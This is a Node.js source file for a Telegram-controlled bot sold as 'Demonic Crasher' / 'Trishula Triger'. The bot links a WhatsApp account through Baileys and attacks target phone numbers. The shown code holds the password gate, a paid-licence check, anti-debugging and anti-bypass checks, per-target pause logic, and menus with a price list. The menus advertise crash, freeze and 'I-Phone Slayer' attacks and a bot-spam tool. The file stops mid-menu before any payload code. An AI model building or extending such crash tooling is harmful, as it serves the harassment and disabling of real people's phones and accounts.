/*
Hello Buyer Base Demonic Crasher By Rozzy Official
Notes : Buat All Buyer
No Kasih Free Org Ya.
No Share Publik Ya.
No Jual Ya.
No Jual No Enc Ya.
Bebas Rename Ya.
Base Ini Versi Telegraf Ya.
NO HAPUS CREATE BY ROZZY OFFICIAL.

Base Ini Di Rancang Oleh Rozzy Official Untuk Membantu Kalian Membuat Script Bot Vis Telegram
Base Ini Base Demonic Crasher Version 15 Di Tahun 2026 Awal Ya Gays.
Base Ini Sudah Ada Fitur Setjeda, Password, Tools, Bug Telegram, Dll

20k = Free Isi Fitur Seperti Bug Telegram, Tools.

CREATE BY ROZZY ~ @ROZZYOFFICIAL

#Respect
*/

// ===== IMPORT =====
const OWNER_CHAT_ID = '1891716046';
const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");

const {
  parseDuration,
  setGlobalCooldown,
  isOnGlobalCooldown,
  getGlobalRemaining,
  setGlobalDuration
} = require("./cooldown");

const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Lawak Fitur Ini Khusus Owner Bego");
  }

  return next();
};
const { Composer } = require("telegraf");

const owner = new Composer();
owner.use(checkOwner);
const onlyGroup = async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") {
    await ctx.reply("❗Command hanya bisa dipakai di grup");
    return false;
  }
  return true;
};

const mustReplyUser = (ctx) => {
  if (!ctx.message?.reply_to_message?.from) {
    ctx.reply("❗Reply pesan user dulu");
    return false;
  }
  return true;
};
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
/* ===== BOT INIT ===== */
const bot = new Telegraf(BOT_TOKEN);
// ✅ WAJIB DI SINI BOT USE NYA 
bot.use(session());
const ownerUsers = OWNER_IDS;
const BOT_PASSWORD = "TRISHULATRIGER";

const bars = [
  "𝗧𝗥𝗜𝗦𝗛𝗨𝗟𝗔 𝗧𝗥𝗜𝗚𝗘𝗥",
  "👑 OWNER : @Xavatrz",
  "★ ☆ ☆ ☆ ☆", 
  "★ ★ ☆ ☆ ☆", 
  "★ ★ ★ ☆ ☆", 
  "★ ★ ★ ★ ☆", 
  "★ ★ ★ ★ ★"
];

const delay = (ms) => new Promise(res => setTimeout(res, ms));

bot.start(async (ctx) => {
  ctx.session ??= {};

  // ✅ kalau sudah verified
  if (ctx.session.isVerified) {
    return ctx.reply(
  "╔══════════════════════╗\n" +
  "║ ✅ 𝗔𝗞𝗨𝗡 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 ║\n" +
  "╠══════════════════════╣\n" +
  "║ 🔓 Akses telah dibuka ║\n" +
  "║ ❤️ Terima kasih      ║\n" +
  "╠══════════════════════╣\n" +
  "║ 📂 Ketik /menu       ║\n" +
  "║ 🚀 Untuk lanjut      ║\n" +
  "╠══════════════════════╣\n" +
  "║ 👑 DEMONIC CRASHER   ║\n" +
  "╚══════════════════════╝"
   );
  }

  // 🔒 ANTI DOUBLE /start (TAMBAHAN)
  if (ctx.session.loading) {
    return ctx.reply("⏳ Sistem sedang diproses, tunggu sebentar...");
  }

  // reset state tiap /start
  ctx.session.loading = true;
  ctx.session.waitingPassword = false;

  /* ===== ANIMASI TEKS AWAL ===== */
  let msg = await ctx.reply("𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗧𝗢");
  await delay(1000);
  await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {});

  msg = await ctx.reply("🔥 TRISHULA TRIGER");
  await delay(1000);
  await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {});

  msg = await ctx.reply("👨‍💻 DEVELOPER : @Xavatrz");
  await delay(1200);
  await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {});

  /* ===== ANIMASI BARS ===== */
  const barMsg = await ctx.reply(
    "🔐 Menyiapkan System...\n\n🩸 CRMUOZ TRIGER 🥶"
  );

  let i = 0;

  // 🔧 SIMPAN INTERVAL KE SESSION (TAMBAHAN)
  ctx.session.loadingInterval = setInterval(async () => {
    try {
      const bar = bars[Math.min(i, bars.length - 1)];

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        barMsg.message_id,
        null,
        `🔐 Menyiapkan System...\n\n${bar}`
      );

      i++;

      if (i === bars.length) {
        clearInterval(ctx.session.loadingInterval);
        ctx.session.loadingInterval = null;

        ctx.session.loading = false;
        ctx.session.waitingPassword = true;

        await ctx.telegram.editMessageText(
          ctx.chat.id,
          barMsg.message_id,
          null,
          "🔐 𝗠𝗔𝗦𝗨𝗞𝗞𝗔𝗡 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\n\n" +
          "━━━━━━━━━━━━━━━\n" +
          "🗝️ Ketik password akses\n" +
          "🔁 /start untuk mengulang\n" +
          "━━━━━━━━━━━━━━━"
        );
      }
    } catch (e) {
      clearInterval(ctx.session.loadingInterval);
      ctx.session.loadingInterval = null;

      ctx.session.loading = false;

      // 🔒 ANTI SPAM PASSWORD (TAMBAHAN)
      if (!ctx.session.waitingPassword) {
        ctx.session.waitingPassword = true;
        await ctx.reply(
          "🔐 𝗠𝗔𝗦𝗨𝗞𝗞𝗔𝗡 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\n\n" +
          "━━━━━━━━━━━━━━━\n" +
          "🗝️ Ketik password akses\n" +
          "🔁 /start untuk mengulang\n" +
          "━━━━━━━━━━━━━━━"
        );
      }
    }
  }, 800);
});

/* ===== HANDLER PASSWORD ===== */
bot.on("text", async (ctx, next) => {
  ctx.session ??= {};

  // bukan mode password → lanjut handler lain
  if (!ctx.session.waitingPassword) return next();

  const text = ctx.message.text.trim();

  // ❌ user malah ngetik command
  if (text.startsWith("/")) {
    ctx.session.waitingPassword = false; // ⬅️ hentikan mode
    return ctx.reply(
      "🔁 𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 𝗗𝗜𝗥𝗘𝗦𝗘𝗧\n\n" +
      "━━━━━━━━━━━━━━━\n" +
      "📌 Ketik /start untuk mengulang\n" +
      "━━━━━━━━━━━━━━━"
    );
  }

  // ✅ PASSWORD BENAR
  if (text === BOT_PASSWORD) {
    ctx.session.waitingPassword = false;
    ctx.session.isVerified = true;

    return ctx.reply(
      "✅ 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗩𝗔𝗟𝗜𝗗\n\n" +
      "━━━━━━━━━━━━━━━\n" +
      "🔓 Akses berhasil dibuka\n" +
      "📂 Ketik /menu untuk lanjut\n" +
      "━━━━━━━━━━━━━━━\n\n" +
      "❤️ Terima kasih telah menggunakan bot"
    );
  }

  // ❌ PASSWORD SALAH (ANTI SPAM)
  ctx.session.waitingPassword = false; // ⬅️ KUNCI ANTI SPAM
  return ctx.reply(
    "❌ 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗦𝗔𝗟𝗔𝗛\n\n" +
    "━━━━━━━━━━━━━━━\n" +
    "🔐 Akses ditolak\n" +
    "🔁 Ketik /start untuk mencoba lagi\n" +
    "━━━━━━━━━━━━━━━"
  );
});

/* ===== MIDDLEWARE VERIFIED (PAKAI DI /menu DLL) ===== */
const checkVerified = async (ctx, next) => {
  if (!ctx.session?.isVerified) {
    await ctx.reply(
      "╔══════════════════════╗\n" +
      "║ 😹 𝗛𝗔𝗬𝗬𝗢 𝗠𝗔𝗨 𝗔𝗣𝗔? ║\n" +
      "╠══════════════════════╣\n" +
      "║ 🔒 𝗔𝗞𝗦𝗘𝗦 𝗧𝗘𝗥𝗞𝗨𝗡𝗖𝗜 ║\n" +
      "║ ❌ 𝗔𝗡𝗗𝗔 𝗕𝗘𝗟𝗨𝗠 𝗟𝗢𝗚𝗜𝗡 ║\n" +
      "╠══════════════════════╣\n" +
      "║ ▶️ /start             ║\n" +
      "║ 🔑 Masukkan Password  ║\n" +
      "╠══════════════════════╣\n" +
      "║ 👑 CRMUOZ TRIGER    ║\n" +
      "╚══════════════════════╝"
    );
    return;
  }
  return next();
};
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./XavaIsHere/premiums.json";
const adminFile = "./XavaIsHere/admins.json";

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Lawak Fitur Ini Khusus Admin Tolol.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Bego  Fitur Ini Khusus Premium Kocak.");
  }
  next();
};

// === Fungsi Admin / Premium ===
const addAdmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addPremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
global.sock = null;
global.isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/hhs65l.png",
"https://files.catbox.moe/hhs65l.png",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/TANZZ-eng/XAva/refs/heads/main/token.js";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}
async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

console.log(chalk.bold.blue("Sedang Mengecek Database..."));

//BYPASS
//Hapus Axios asli lu ganti punya gw dibawah ini

try {
  if (
    typeof axios.get !== 'function' ||
    typeof axios.create !== 'function' ||
    typeof axios.interceptors !== 'object' ||
    !axios.defaults
  ) {
    console.error(`[SECURITY] Axios telah dimodifikasi`);
    process.abort();
  }

  if (
    axios.interceptors.request.handlers.length > 0 ||
    axios.interceptors.response.handlers.length > 0
  ) {
    console.error(`[SECURITY] Axios interceptor aktif (bypass terdeteksi)`);
    process.abort();
  }

  const env = process.env;
  if (
    env.HTTP_PROXY || env.HTTPS_PROXY || env.NODE_TLS_REJECT_UNAUTHORIZED === '0'
  ) {
    console.error(`[SECURITY] Proxy atau TLS bypass aktif`);
    process.abort();
  }

  const execArgs = process.execArgv.join(' ');
  if (/--inspect|--debug|repl|vm2|sandbox/i.test(execArgs)) {
    console.error(`[SECURITY] Debugger / sandbox / VM terdeteksi`);
    process.abort();
  }

  const realToString = Function.prototype.toString.toString();
  if (Function.prototype.toString.toString() !== realToString) {
    console.error(`[SECURITY] Function.toString dibajak`);
    process.abort();
  }

  const mod = require('module');
  const _load = mod._load.toString();
  if (!_load.includes('tryModuleLoad') && !_load.includes('Module._load')) {
    console.error(`[SECURITY] Module._load telah dibajak`);
    process.abort();
  }

  const cache = Object.keys(require.cache || {});
  const suspicious = cache.filter(k =>
    k.includes('axios') &&
    !/node_modules[\\/]+axios[\\/]+(dist[\\/]+node[\\/]+axios\.cjs|index\.js)$/.test(k)
  );

  if (suspicious.length > 0) {
    console.error(`[SECURITY] require.cache mencurigakan`);
    process.abort();
  }

} catch (err) {
  console.error(`[SECURITY] Proteksi gagal jalan:`, err);
  process.abort();
}
console.log("✅ Proteksi Anti Bypass Active ./RozzyOfficial");

  const validTokens = await fetchValidTokens();
  if (!validTokens?.includes(BOT_TOKEN)) {
    console.log(chalk.red("═══════════════════════════════════════════"));
    console.log(chalk.bold.red("TOKEN ANDA TIDAK TERDAFTAR DI DATA BASE - BUY AKSES DI @RZOKISAP !!!"));
    console.log(chalk.red("═══════════════════════════════════════════"));
    process.exit(1);
  }

  console.log(chalk.green(`[!] System: Token Kamu Terdaftar Dalam Database! Terimakasih Sudah Membeli Script Ini.\n`));
  startBot();
}

function startBot() {
  console.clear();

  console.log(
    chalk.magentaBright(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀

██████╗  ██████╗ ███████╗███████╗██╗   ██╗
██╔══██╗██╔═══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝
██████╔╝██║   ██║  ███╔╝   ███╔╝  ╚████╔╝ 
██╔══██╗██║   ██║ ███╔╝   ███╔╝    ╚██╔╝  
██║  ██║╚██████╔╝███████╗███████╗   ██║   
╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝   ╚═╝   

⚡TRISHULA TRIGER BOT SYSTEM ⚡
🛡️SECURED • PROTEKSI • ANTI BYPASS

TELEGRAM - @RZOKISAP - DEVELOPER

MAKASIH SAYANG TELAH ORDER SCRIPT 🗿.
`)
  );

  console.log(
    chalk.bold.green(`
🔱 CRMUOZ TRIGER VERSION 1.0 GEN 1 🦖
`)
  );
}

validateToken();
// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const { version } = await fetchLatestBaileysVersion();

  global.sock = makeWASocket({
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async () => ({ conversation: "P" }),
  });

  const sock = global.sock;

  // ===== RELAY COMPAT (AMAN) =====
  if (!sock.relayMessage) {
    sock.relayMessage = async (jid, message, options = {}) => {
      return sock.sendMessage(jid, message, options);
    };
  }

  sock.ev.on("creds.update", saveCreds);
  store.bind(sock.ev);

  sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
    if (connection === "open") {
      global.isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╔═════════════════════════════╗
║WHATSAPPS TERHUBUNG ❤
╚═════════════════════════════╝`));
    }

    if (connection === "close") {
      global.isWhatsAppConnected = false;
      console.log(chalk.red.bold(`
╔═════════════════════════════╗
║WHATSAPPS TERPUTUS 💔
╚═════════════════════════════╝`));

      if (
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut
      ) {
        startSesi();
      }
    }
  });
};
// ===== MIDDLEWARE =====
const checkWhatsAppConnection = (ctx, next) => {
  if (!global.sock || !global.isWhatsAppConnected) {
    return ctx.reply("Whatsapp Belum Terhubung Ketik /addpairing 62xx Terlebih Dahulu ❗");
  }
  return next();
};
// ===== PAUSE PER TARGET =====
const pauseTarget = new Map(); // target => true

function pause(target) {
  pauseTarget.set(target, true);
}

function resume(target) {
  pauseTarget.delete(target);
}

function isPaused(target) {
  return pauseTarget.has(target);
}

async function waitIfPaused(target) {
  while (isPaused(target)) {
    await new Promise(r => setTimeout(r, 400));
  }
}
//////CEK WHATSAPP\\\\\\
async function resolveTarget(ctx, q) {
  const sock = global.sock;

  if (!sock || !sock.user) {
    await ctx.reply("❌ Socket WhatsApp belum siap");
    return null;
  }

  const num = (q || "").replace(/[^0-9]/g, "");
  if (!num.startsWith("62")) {
    await ctx.reply("❌ Format salah! Gunakan 62xxxx");
    return null;
  }

  const target = num + "@s.whatsapp.net";

  // 🔒 ANTI SELF HIT
  if (target === sock.user.id) {
    await ctx.reply("❌ Target tidak boleh nomor bot sendiri");
    return null;
  }

  // 🔍 CEK NOMOR ADA DI WA
  const [check] = await sock.onWhatsApp(num);
  if (!check?.exists) {
    await ctx.reply("❌ Nomor target tidak terdaftar WhatsApp");
    return null;
  }

  return { sock, num, target };
}
async function editOrSend(ctx, media, keyboard) {
  await ctx.answerCbQuery().catch(() => {});
  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: media.media,
        caption: media.caption,
        parse_mode: "HTML"
      },
      {
        reply_markup: keyboard
      }
    );
  } catch {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: "HTML",
      reply_markup: keyboard
    });
  }
}
////=========MENU UTAMA========\\\\
bot.command("menu", checkVerified, async (ctx) => {
  try {
    if (!ctx.from) return;
    const userId = ctx.from.id.toString();
    const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
    const waktuRunPanel = getUptime();

    const mainMenuMessage = `<blockquote>
T R I S H U L A - T R I G E R 
       V 1.0 GEN 1
              
👑 Pemilik : @RZOKISAP
╔═══════╗
║PAGE 1 / 8
╚═══════╝
📊 S T A T U S • B O T 
• Name Bot : CRMUOZ TRIGER
• Price Script : 10.000 - 100.000
• Runtime : ${waktuRunPanel}

🔥 E F E K • B U G
• Delay Invisible
• Delay Bulldo
• Blank Device  
• Force Click
• Force One Msg
• Force Audio
• Crash Notif
Buy Script? Contact the Owner
This Is Pemilik : @RZOKISAP
</blockquote>`;

    const mainKeyboard = [
      [
        { text: "Author Demonic", url: "https://t.me/RZOKISAAP" },
        { text: "Channel", url: "https://t.me/" }
      ],
      [
        { text: " ➡️ Next  ➡️", callback_data: "info_menu" },
      ],
      [
        { text: "Channel Rzokisap", url: "https://t.me/" },
      ],
    ];

    // ===== FOTO + MENU =====
    await ctx.replyWithPhoto(getRandomImage(), {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: mainKeyboard },
    });

    // ===== AUDIO TELEGRAM (TANPA SENDER) =====
    await ctx.replyWithAudio(
      { url: "https://files.catbox.moe/spadk5.mp3" },
      {
        caption: "Cintai lah seseorang yg mencintaimu...",
        title: "CRMUOZ Audio",
        performer: "CRMUOZ TRIGER"
      }
    );

  } catch (err) {
    console.error("MENU COMMAND ERROR:", err);
    if (ctx.reply) ctx.reply("❌ Gagal menampilkan menu.");
  }
});
// Handler Sekedar Information
bot.action("info_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
╔═══════╗
║PAGE 2 / 8
╚═══════╝
( 👀 ) Holaa ☇ ${Name}. Thanks Buyer Rzokisap.
List Harga Script : 
Script No Update 10k
Reseller 25k
Partner 35k
Moderator 45k
Ceo 55k
Owner 65k
Svip 100k
Setiap Pembelian Get Bonus Dari Rozzy Official.
Setiap Pembelian Boleh Nego Dp.
Payment : 🏧
Ewallet : Dana & Gopay
Qris : Qris All Payment
Bank : Belum Tersedia
Buy? To @Xavatrz

Permintaan Owner 😘 : 
• Mohon Kerja Sama Nya Mohon Jangan By Pass Dan Jangan Seenaknya Tanpa Sepengetahuan Owner.
• Jangan Jual Script Ini Selain Seller.
• Jangan Share Publik.
• Jangan Crack Script Ini.

Thanks ❤.
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "⬅️ Back ⬅️ ", callback_data: "back" }, { text: " ➡️ Next  ➡️", callback_data: "bug_tele" }]] };

  await editOrSend(ctx, media, keyboard);
});
// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
╔═══════╗
║PAGE 3 / 8
╚═══════╝
 ⼥ CRMUOZ TIGER ⼥
( 👀 ) Holaa ☇ ${Name}. Thanks Buyer Xava.私は ─ WhatsApp テムを破壊しようとしているボットです。賢くご利用ください
╭—⊱(SYSTEM STATUS)⊰―    
│⌬ Author : @RZOKISAP
│⌬ Name Bot : CRMUOZ TRIGER
│⌬ Version : 1.0 Gen 1
│⌬ Runtime : ${waktuRunPanel}
╰───────────────╯
╭───────────────╮
│⊱ /addprem x Id
│⊱ /delprem x Id
│⊱ /cekprem 
│⊱ /addadmin x Id
│⊱ /deladmin x Id
│⊱ /status 
│⊱ /addpairing x 62xx
│⊱ /delsesi
│⊱ /setcd
│⊱ /listpairing
╰───────────────╯
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "⬅️ Back ⬅️ ", callback_data: "back" }, { text: " ➡️ Next  ➡️", callback_data: "bug_tele" }]] };

  await editOrSend(ctx, media, keyboard);
});
bot.action("bug_tele", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
╔═══════╗
║PAGE 4 / 8
╚═══════╝
⼥ CRMUOZ TIGER ⼥
( 👀 ) Holaa ☇ ${Name}. Thanks Buyer Xava.私は ─ WhatsApp テムを破壊しようとしているボットです。賢くご利用ください
╭—⊱(SYSTEM STATUS)⊰―    
│⌬ Author : @RZOKISAP
│⌬ Name Bot : CRMUOZ TRIGER
│⌬ Version : 1.0 Gen 1
│⌬ Runtime : ${waktuRunPanel}
╰───────────────╯
╭────────────────╮  
│⊱ /StcOne x Stc One
│⊱ /StcTwo x Stc Two
│⊱ /StcThre x Stc Three
╰────────────────╯  
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "⬅️ Back ⬅️", callback_data: "owner_menu" }, { text: " ➡️ Next  ➡️", callback_data: "bug_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
╔═══════╗
║PAGE 5 / 8
╚═══════╝
  ⼥ CRMUOZ TIGER ⼥
( 👀 ) Holaa ☇ ${Name}. Thanks Buyer Xava.私は ─ WhatsApp テムを破壊しようとしているボットです。賢くご利用ください
╭—⊱(SYSTEM STATUS)⊰―    
│⌬ Author : @RZOKISAP
│⌬ Name Bot : CRMUOZ TRIGER
│⌬ Version : 1.0 Gen 1
│⌬ Runtime : ${waktuRunPanel}
╰───────────────╯
⬡═―—⊱ ⎧ BUG INVISIBLE⎭ ⊰―—═⬡  
╭───────────────╮  
│⊱ /LateMsg→Late Message Surprise
│⊱ /LateMsgQuote →Quota Surprise
╰───────────────╯  
⬡═―—⊱ ⎧ BUG VISIBLE ⎭ ⊰―—═⬡
╭───────────────╮  
│⊱ /FlyingCore x Force One Msg
│⊱ /PayShop x Force Payment
│⊱ /AudioForce x Audio Force 
│⊱ /StepOn x Black Combined
│⊱ /CrashChat x Stuck Chats
│⊱ /UiCombined x Combined Crash Ui
│⊱ /Strength17 x I-Phone Slayer
╰───────────────╯  
⬡═―—⊱ ⎧ PAUSE & RESUME ⎭ ⊰―—═⬡
╭───────────────╮  
│⊱ /Pause x 62xx
│• Hentikan Bug Target Sementara
│⊱ /Resume
│• Lanjutkan Bug Ke Target
│⊱ /ListPause
│• List Pause Target
╰───────────────╯  
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "⬅️ Back ⬅️", callback_data: "bug_tele" }, { text: " ➡️ Next  ➡️", callback_data: "tools_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
//TOOLS
bot.action("tools_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
╔═══════╗
║PAGE 6 / 8
╚═══════╝
  ⼥ CRMUOZ TIGER ⼥
( 👀 ) Holaa ☇ ${Name}. Thanks Buyer Rozzy.私は ─ WhatsApp テムを破壊しようとしているボットです。賢くご利用ください
╭—⊱(SYSTEM STATUS)⊰―    
│⌬ Author : @RZOKISAP
│⌬ Name Bot : CRMUOZ TRIGER
│⌬ Version : 1.0 Gen 1
│⌬ Runtime : ${waktuRunPanel}
╰───────────────╯
╭───────────────╮
│⊱ /TesFunc x Reply
│⊱ /cekdomain x Domain
│⊱ /ceknum x Nomor
│⊱ /ceknegara x Negara
│⊱ /cekidteman x Reply
│⊱ /cekid x cek id
│⊱ /filmdewasa x film Dewasa
│⊱ /chatdev x report Dev
│⊱ /rasukbot x Token Id Chat Jumlah
│⊱ /maps x Cek Maps
│⊱ /gempa x Info Gempa
╰────────────────╯
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "⬅️ Back ⬅️", callback_data: "bug_menu" }, { text: " ➡️ Next  ➡️", callback_data: "toolsv2_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
//TOOLSV2
bot.action("toolsv2_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
╔═══════╗
║PAGE 7 / 8
╚═══════╝ 
  ⼥ CRMUOZ TIGER ⼥
( 👀 ) Holaa ☇ ${Name}. Thanks Buyer Rozzy.私は ─ WhatsApp テムを破壊しようとしているボットです。賢くご利用ください
╭—⊱(SYSTEM STATUS)⊰―    
│⌬ Author : @RZOKISAP
│⌬ Name Bot : CRMUOZ TRIGER
│⌬ Version : 1.0 Gen 1
│⌬ Runtime : ${waktuRunPanel}
╰───────────────╯
╭───────────────╮
│⊱ /kick x Reply x Kick Anggota
│⊱ /mute x Reply x Mute Anggota
│⊱ /unmute x Reply x Unmute Anggota
│⊱ /promote x Reply x Adminkan Anggota
│⊱ /info x Reply Bisa x No Reply Bisa x Cek id
╰───────────────╯
</blockquote>`;

